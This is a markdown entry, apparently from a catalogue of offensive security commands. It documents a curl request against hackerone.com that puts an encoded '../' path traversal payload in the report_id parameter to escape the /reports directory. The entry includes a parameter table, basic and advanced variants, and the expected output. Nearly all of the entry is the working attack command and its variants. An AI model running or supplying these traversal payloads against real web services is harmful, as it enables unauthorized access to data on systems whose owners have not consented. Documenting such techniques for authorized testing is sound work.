---
id: cmd-003
data: >-
  curl -X GET
  "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1"
  -H "Cookie: your_session_cookie"
tags:
  - traversal
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:30.169Z'
verified: false
validated: true
submitted: true
---
# path-traversal-escape

## Command

```bash
curl -X GET "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2F99698%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1" -H "Cookie: your_session_cookie"
```

## Description

Performs path traversal using encoded '../' to escape the /reports directory and access root paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `report_id` | Traversal payload (e.g., ..%2F..%2F..%2F99698%3F) | Yes |
| `subject` | Team | Yes |
| `Cookie` | Session | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://hackerone.com/bugs?report_id=..%2F..%2F..%2Ftest" -H "Cookie: your_session_cookie"
```

### Advanced Usage

```bash
curl -X GET "https://hackerone.com/bugs?report_id=..%2F..%2F..%2Fpath%3Fparam" -v
```

## Expected Output

Internal GET to /99698?.json from root (200 or processed response).

## Related

- [[commands/query-appended-report-id]]
- [[procedures/Perform-Path-Traversal-to-Escape-Directory]]
